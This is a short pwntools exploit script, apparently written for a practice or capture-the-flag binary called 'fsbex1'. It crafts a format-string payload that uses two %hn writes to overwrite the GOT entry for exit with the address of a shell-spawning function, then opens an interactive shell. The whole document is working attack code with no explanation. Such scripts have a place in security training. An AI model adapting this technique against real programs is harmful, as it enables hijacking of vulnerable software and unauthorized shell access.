from pwn import *
context.terminal=['tmux', 'splitw', '-h']
p = process('./fsbex1')
e = ELF('./fsbex1')

exit_got = e.got['exit']

shell_low = 0x9196
shell_high = 0x0804

payload = b''
payload += (p32(exit_got))
payload += (p32(exit_got + 2))
payload += b'%' + str(shell_low-8).encode() + b'c'
payload += b'%4$hn'
payload += b'%' + str(0x10000+shell_high-shell_low).encode() + b'c'
payload += b'%5$hn'

p.send(payload)
p.interactive()